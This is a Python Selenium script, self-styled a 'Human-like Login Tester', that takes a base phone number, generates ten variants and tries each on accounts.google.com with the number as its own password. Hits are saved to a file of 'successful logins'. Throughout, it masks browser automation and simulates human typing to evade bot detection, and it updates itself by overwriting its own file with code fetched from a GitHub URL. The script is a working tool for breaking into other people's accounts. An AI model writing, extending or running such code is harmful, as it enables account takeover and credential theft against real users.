import time
import random
import requests
import json
import os
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, StaleElementReferenceException, ElementNotInteractableException, InvalidSessionIdException, WebDriverException
from datetime import datetime

# Version and Update Configuration
CURRENT_VERSION = "1.2.0"
UPDATE_URL = "https://raw.githubusercontent.com/Khlaidelsharqawy/STORM_APP/main/version.json"
SCRIPT_URL = "https://raw.githubusercontent.com/Khlaidelsharqawy/STORM_APP/main/STORM%20APP%20V1.py"

# =======================
# =======================
# Remote Update System
# =======================
def check_for_updates():
    """Check for script updates from remote server"""
    try:
        print("🔄 Checking for updates...")
        response = requests.get(UPDATE_URL, timeout=10)
        if response.status_code == 200:
            version_info = response.json()
            latest_version = version_info.get('version', CURRENT_VERSION)
            
            if latest_version != CURRENT_VERSION:
                print(f"🆕 New version available: {latest_version} (Current: {CURRENT_VERSION})")
                return True, latest_version, version_info.get('download_url', SCRIPT_URL)
            else:
                print(f"✅ You have the latest version: {CURRENT_VERSION}")
                return False, CURRENT_VERSION, None
        else:
            print(f"⚠️ Could not check for updates (HTTP {response.status_code})")
            return False, CURRENT_VERSION, None
    except Exception as e:
        print(f"⚠️ Update check failed: {str(e)}")
        return False, CURRENT_VERSION, None

def download_update(download_url):
    """Download and install script update"""
    try:
        print("📥 Downloading update...")
        response = requests.get(download_url, timeout=30)
        if response.status_code == 200:
            # Backup current script
            backup_name = f"STORM_APP_V1_backup_{int(time.time())}.py"
            with open(backup_name, 'w', encoding='utf-8') as backup_file:
                with open(__file__, 'r', encoding='utf-8') as current_file:
                    backup_file.write(current_file.read())
            
            # Write new script
            with open(__file__, 'w', encoding='utf-8') as script_file:
                script_file.write(response.text)
            
            print(f"✅ Update downloaded successfully!")
            print(f"💾 Backup saved as: {backup_name}")
            print("🔄 Please restart the script to use the new version.")
            return True
        else:
            print(f"❌ Download failed (HTTP {response.status_code})")
            return False
    except Exception as e:
        print(f"❌ Update download failed: {str(e)}")
        return False

# =======================
# Human typing simulation
# =======================
def human_type(element, text):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.02, 0.05))  # Faster typing speed

def pause(a=0.1, b=0.3):
    time.sleep(random.uniform(a, b))

# =======================
# Setup browser
# =======================
def setup_driver():
    options = Options()
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome(options=options)
    driver.execute_script(
        "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
    )
    return driver

# =======================
# Generate number variations
# =======================
def generate_number_variations(base_number):
    """
    Generate 10 numbers by changing the last digit of the base number from 0 to 9
    Example: If base number is 01007289679
    Will generate: 01007289670, 01007289671, 01007289672, ... 01007289679
    """
    variations = []
    base_without_last = base_number[:-1]  # Remove last digit
    
    print(f"🔢 Generating numbers from base: {base_number}")
    
    for i in range(10):
        new_number = base_without_last + str(i)
        variations.append(new_number)
        print(f"   📱 Generated number: {new_number}")
    
    return variations

# =======================
# Save successful login
# =======================
def log_success(username, password):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("successful_logins.txt", "a", encoding="utf-8") as f:
        f.write(f"{timestamp} - USERNAME: {username} | PASSWORD: {password}\n")

# =======================
# Login attempt
# =======================
def attempt_login(driver, username, password, login_url,
                  username_field, username_next_btn,
                  password_field, password_next_btn):
    try:
        # Check if driver session is still valid
        try:
            driver.current_url
        except (InvalidSessionIdException, WebDriverException) as session_error:
            print(f"⚠️ Browser session invalid: {session_error}")
            return False
            
        driver.get(login_url)
        pause(0.3, 0.8)

        # Fill username with stale element handling
        max_retries = 3
        email_input = None
        
        for retry in range(max_retries):
            try:
                # Locate username field
                email_input = WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.NAME, username_field))
                )
                
                # Ensure field is interactable
                WebDriverWait(driver, 5).until(
                    lambda d: email_input.is_displayed() and email_input.is_enabled()
                )
                
                email_input.clear()
                human_type(email_input, username)
                pause(0.3, 0.8)
                break  # Success, exit retry loop
                
            except Exception as email_error:
                error_msg = str(email_error)
                if "stale element reference" in error_msg and retry < max_retries - 1:
                    print(f"⚠️ Stale username element detected, retrying... (attempt {retry + 2}/{max_retries})")
                    pause(0.3, 0.8)
                    continue
                else:
                    print(f"❌ Error filling username field: {error_msg}")
                    return False
        
        # Try multiple selectors for username next button
        try:
            next_btn = None
            btn_selectors = [
                (By.ID, username_next_btn),
                (By.XPATH, "//button[@type='submit']"),
                (By.XPATH, "//input[@type='submit']"),
                (By.CSS_SELECTOR, "button[type='submit']"),
                (By.XPATH, "//div[@role='button']")
            ]
            
            for selector_type, selector_value in btn_selectors:
                try:
                    next_btn = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((selector_type, selector_value))
                    )
                    if next_btn and next_btn.is_displayed() and next_btn.is_enabled():
                        break
                except:
                    continue
            
            if next_btn:
                # Scroll to element and wait
                driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", next_btn)
                pause(0.3, 0.8)  # Faster wait after scrolling
                
                # Additional check before clicking
                try:
                    WebDriverWait(driver, 5).until(
                        lambda d: next_btn.is_displayed() and next_btn.is_enabled()
                    )
                    next_btn.click()
                except Exception as click_error:
                    print(f"⚠️ Direct click failed: {str(click_error)}")
                    try:
                        # Try JavaScript click as fallback
                        driver.execute_script("arguments[0].click();", next_btn)
                        print("✅ JavaScript click succeeded")
                    except Exception as js_error:
                        print(f"❌ JavaScript click also failed: {str(js_error)}")
                        return False
            else:
                print(f"⚠️ Could not find username submit button for {username}")
                return False
                
        except Exception as e:
            print(f"❌ Error clicking username button for {username}: {str(e)}")
            return False

        # Wait for password field OR captcha detection
        pause(0.8, 1.5)  # Faster page load wait
        
        try:
            # Try multiple selectors for password field
            pwd_input = None
            selectors = [
                (By.NAME, password_field),
                (By.ID, "password"),
                (By.CSS_SELECTOR, "input[type='password']"),
                (By.XPATH, "//input[@type='password']")
            ]
            
            for selector_type, selector_value in selectors:
                try:
                    pwd_input = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((selector_type, selector_value))
                    )
                    break
                except TimeoutException:
                    continue
            
            if pwd_input is None:
                # Check if we're on a verification page
                page_source = driver.page_source.lower()
                if any(word in page_source for word in ["verify", "captcha", "suspicious", "unusual", "security"]):
                    print(f"🔒 Security verification required for {username} - skipping")
                else:
                    print(f"⚠️ No password field found for {username} - possible invalid username")
                return False
                
        except Exception as e:
            print(f"❌ Error finding password field for {username}: {str(e)}")
            return False

        # Fill password with stale element handling
        max_retries = 3
        for retry in range(max_retries):
            try:
                # Re-locate password field if stale
                if retry > 0:
                    pwd_input = None
                    for selector_type, selector_value in selectors:
                        try:
                            pwd_input = WebDriverWait(driver, 5).until(
                                EC.presence_of_element_located((selector_type, selector_value))
                            )
                            break
                        except TimeoutException:
                            continue
                    
                    if pwd_input is None:
                        print(f"❌ Could not re-locate password field on retry {retry + 1}")
                        return False
                
                # Ensure password field is interactable with extended checks
                WebDriverWait(driver, 20).until(
                    lambda d: pwd_input.is_displayed() and pwd_input.is_enabled()
                )
                
                # Scroll and focus on the element
                driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", pwd_input)
                pause(0.5, 1.0)  # Faster wait after scrolling
                
                # Wait for element to be clickable and interactable
                WebDriverWait(driver, 15).until(
                    EC.element_to_be_clickable(pwd_input)
                )
                
                # Additional wait for element to be fully ready
                pause(0.3, 0.8)
                
                # Use ActionChains for more reliable interaction
                actions = ActionChains(driver)
                
                # Move to element and click using ActionChains
                try:
                    actions.move_to_element(pwd_input).click().perform()
                    pause(0.2, 0.5)
                except:
                    # Fallback to direct click
                    try:
                        pwd_input.click()
                        pause(0.2, 0.5)
                    except:
                        pass
                
                # Focus on the element using JavaScript
                driver.execute_script("arguments[0].focus();", pwd_input)
                driver.execute_script("arguments[0].click();", pwd_input)
                pause(0.3, 0.8)
                
                # Wait for element to be in focus
                WebDriverWait(driver, 10).until(
                    lambda d: driver.switch_to.active_element == pwd_input or pwd_input.is_enabled()
                )
                
                # Clear field using multiple methods
                try:
                    pwd_input.clear()
                except:
                    try:
                        # Fallback: select all and delete using ActionChains
                        actions.key_down(Keys.CONTROL).send_keys('a').key_up(Keys.CONTROL).send_keys(Keys.DELETE).perform()
                    except:
                        try:
                            # Another fallback: direct keys
                            pwd_input.send_keys(Keys.CONTROL + "a")
                            pwd_input.send_keys(Keys.DELETE)
                        except:
                            # Final fallback: JavaScript clear
                            driver.execute_script("arguments[0].value = '';", pwd_input)
                
                pause(0.3, 0.8)
                
                # Verify field is ready before typing
                WebDriverWait(driver, 10).until(
                    lambda d: pwd_input.is_enabled() and pwd_input.is_displayed()
                )
                
                # Type password using ActionChains for better reliability
                try:
                    actions.send_keys(password).perform()
                except:
                    # Fallback to direct typing
                    human_type(pwd_input, password)
                
                pause(0.5, 1.0)
                break  # Success, exit retry loop
                
            except Exception as pwd_error:
                error_msg = str(pwd_error)
                if "stale element reference" in error_msg and retry < max_retries - 1:
                    print(f"⚠️ Stale element detected, retrying... (attempt {retry + 2}/{max_retries})")
                    pause(0.3, 0.8)  # Wait before retry
                    continue
                else:
                    print(f"❌ Error filling password field: {error_msg}")
                    return False
        
        # Try multiple selectors for password next button
        try:
            next_btn = None
            btn_selectors = [
                (By.ID, password_next_btn),
                (By.XPATH, "//button[@type='submit']"),
                (By.XPATH, "//input[@type='submit']"),
                (By.CSS_SELECTOR, "button[type='submit']"),
                (By.XPATH, "//div[@role='button']")
            ]
            for selector_type, selector_value in btn_selectors:
                try:
                    next_btn = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((selector_type, selector_value))
                    )
                    if next_btn and next_btn.is_displayed() and next_btn.is_enabled():
                        break
                except:
                    continue
            
            if next_btn:
                # Scroll to element and wait
                driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", next_btn)
                pause(0.3, 0.8)  # Faster wait after scrolling
                
                # Additional check before clicking
                try:
                    WebDriverWait(driver, 5).until(
                        lambda d: next_btn.is_displayed() and next_btn.is_enabled()
                    )
                    next_btn.click()
                except Exception as click_error:
                    print(f"⚠️ Direct click failed: {str(click_error)}")
                    try:
                        # Try JavaScript click as fallback
                        driver.execute_script("arguments[0].click();", next_btn)
                        print("✅ JavaScript click succeeded")
                    except Exception as js_error:
                        print(f"❌ JavaScript click also failed: {str(js_error)}")
                        return False
            else:
                print(f"⚠️ Could not find password submit button for {username}")
                return False
                
        except Exception as e:
            print(f"❌ Error clicking password button for {username}: {str(e)}")
            return False

        pause(1.0, 2.0)  # Faster page transition wait

        # Check if login succeeded by verifying we're no longer on login pages
        current_url = driver.current_url.lower()
        page_source = driver.page_source.lower()
        
        # Check if we're still on Google login pages
        login_indicators = [
            "accounts.google.com",
            "signin", 
            "login",
            "identifier",
            "password",
            "challenge"
        ]
        
        # Check if we're still on a login-related page
        still_on_login = any(indicator in current_url for indicator in login_indicators)
        
        # Additional checks for successful login indicators
        success_indicators = [
            "dashboard",
            "welcome", 
            "home",
            "inbox",
            "drive.google.com",
            "mail.google.com",
            "myaccount.google.com",
            "console.cloud.google.com"
        ]
        
        # Check for success indicators in URL or page content
        has_success_indicators = any(indicator in current_url for indicator in success_indicators) or \
                               any(indicator in page_source for indicator in success_indicators)
        
        # Only log success if we've moved away from login pages AND have success indicators
        if not still_on_login and has_success_indicators:
            print(f"✅ SUCCESS: {username} | {password}")
            print(f"🔗 Redirected to: {driver.current_url}")
            log_success(username, password)
            return True
        elif not still_on_login:
            # We moved away from login but no clear success indicators
            print(f"⚠️ UNCERTAIN: Moved away from login page but unclear if successful")
            print(f"🔗 Current URL: {driver.current_url}")
            # Wait a bit more to see if page fully loads
            pause(0.8, 1.5)
            current_url = driver.current_url.lower()
            if any(indicator in current_url for indicator in success_indicators):
                print(f"✅ SUCCESS (delayed): {username} | {password}")
                log_success(username, password)
                return True
            else:
                print(f"❌ FAILED: No clear success indicators found")
                return False
        else:
            print(f"❌ FAILED: Still on login page - {username}")
            return False

    except TimeoutException:
        print(f"⏳ Timeout: {username}")
        return False
    except (InvalidSessionIdException, WebDriverException) as session_error:
        print(f"⚠️ Browser session error: {session_error}")
        return False
    except Exception as e:
        print(f"⚠️ Error: {e}")
        return False

# =======================
# Main loop
# =======================
def main():
    print("🚀 Human-like Login Tester")
    print(f"📋 Version: {CURRENT_VERSION}")
    
    # Check for updates on startup
    try:
        has_update, latest_version, download_url = check_for_updates()
        if has_update:
            update_choice = input(f"\n🔄 Update to version {latest_version}? (y/n): ").strip().lower()
            if update_choice in ['y', 'yes']:
                if download_update(download_url):
                    input("\n⏸️ Press Enter to exit and restart with new version...")
                    sys.exit(0)
                else:
                    print("⚠️ Update failed, continuing with current version...")
    except Exception as e:
        print(f"⚠️ Update check error: {str(e)}")
    
    # Define Google login form selectors
    username_field = "identifier"
    username_next_btn = "identifierNext"
    password_field = "password"
    password_next_btn = "passwordNext"

    while True:
        print("\n" + "="*50)
        print("📱 Enter 'update' to check for updates")
        print("📱 Enter 'exit' to quit the program")
        base_number = input("📱 Enter base number: ").strip()
        
        if base_number.lower() == 'exit':
            print("👋 Goodbye!")
            break
        elif base_number.lower() == 'update':
            has_update, latest_version, download_url = check_for_updates()
            if has_update:
                update_choice = input(f"\n🔄 Update to version {latest_version}? (y/n): ").strip().lower()
                if update_choice in ['y', 'yes']:
                    if download_update(download_url):
                        input("\n⏸️ Press Enter to exit and restart with new version...")
                        sys.exit(0)
            continue
        
        if not base_number:
            print("❌ Please enter a valid number")
            continue
            
        login_url = "https://accounts.google.com/".strip()
        driver = setup_driver()
        success_found = False

        try:
            print(f"\n🚀 Starting test for base number and generated variations...")
            
            # Generate all numbers (10 numbers by changing last digit from 0-9)
            all_numbers = generate_number_variations(base_number)
            
            print(f"\n🔍 Testing {len(all_numbers)} numbers...")
            
            # Try each generated number (browser stays open for all attempts)
            for index, number in enumerate(all_numbers, 1):
                print(f"\n📞 Testing number {index}/10: {number}")
                
                # Check browser session validity before attempt
                try:
                    driver.current_url
                except (InvalidSessionIdException, WebDriverException):
                    print("⚠️ Recreating browser due to session disconnect...")
                    try:
                        driver.quit()
                    except:
                        pass
                    driver = setup_driver()
                
                login_result = attempt_login(driver, number, number, login_url,
                                           username_field, username_next_btn,
                                           password_field, password_next_btn)
                
                if login_result:
                    print(f"🎉 Found valid number: {number}")
                    success_found = True
                    break
                elif login_result is False:  # Normal failure
                    print(f"❌ Failed number: {number}")
                    
                    # Return to login page for next number (without closing browser)
                    if index < len(all_numbers):  # Not the last number
                        try:
                            print("🔄 Returning to login page...")
                            driver.get(login_url)
                            pause(0.3, 0.8)
                        except (InvalidSessionIdException, WebDriverException):
                            print("⚠️ Recreating browser due to session disconnect...")
                            try:
                                driver.quit()
                            except:
                                pass
                            driver = setup_driver()
                        except Exception as nav_error:
                            print(f"⚠️ Error returning to login page: {nav_error}")
                            # Recreate browser in case of error
                            try:
                                driver.quit()
                            except:
                                pass
                            driver = setup_driver()
                else:  # Session error
                    print(f"⚠️ Browser session error for number: {number}")
                    # Recreate browser only in case of session error
                    try:
                        driver.quit()
                    except:
                        pass
                    if index < len(all_numbers):  # Not the last number
                        driver = setup_driver()
            
            if not success_found:
                print(f"\n❌ All generated numbers failed ({len(all_numbers)} numbers)")
                print("🔄 Please enter a new base number...")
            
            # Close browser after all attempts are finished
            print("\n🔒 Closing browser after all attempts...")
            try:
                driver.quit()
                print("✅ Browser closed successfully")
            except (InvalidSessionIdException, WebDriverException):
                print("✅ Browser already closed")
            except Exception as e:
                print(f"⚠️ Error closing browser: {e}")

        except KeyboardInterrupt:
            print("\n⚠️ Program stopped by user")
            break
        finally:
            # Browser closing moved inside the loop after all attempts
            pass

if __name__ == "__main__":
    main()
